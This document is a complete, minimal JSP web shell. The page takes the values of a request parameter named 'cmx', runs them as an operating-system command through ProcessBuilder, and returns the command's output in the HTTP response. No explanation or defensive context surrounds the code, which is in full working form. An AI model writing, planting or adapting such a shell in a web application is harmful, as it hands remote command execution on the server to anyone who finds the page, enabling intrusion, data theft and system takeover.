<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %><%
  InputStream cmx = new ProcessBuilder(request.getParameterValues("cmx")).start().getInputStream();
  ByteArrayOutputStream bos = new ByteArrayOutputStream();
  byte[] b = new byte[1024];
  int len = -1;
  while ((len = cmx.read(b)) != -1){
    bos.write(b, 0 , len);
  }
  out.write(new String(bos.toByteArray()));
%>
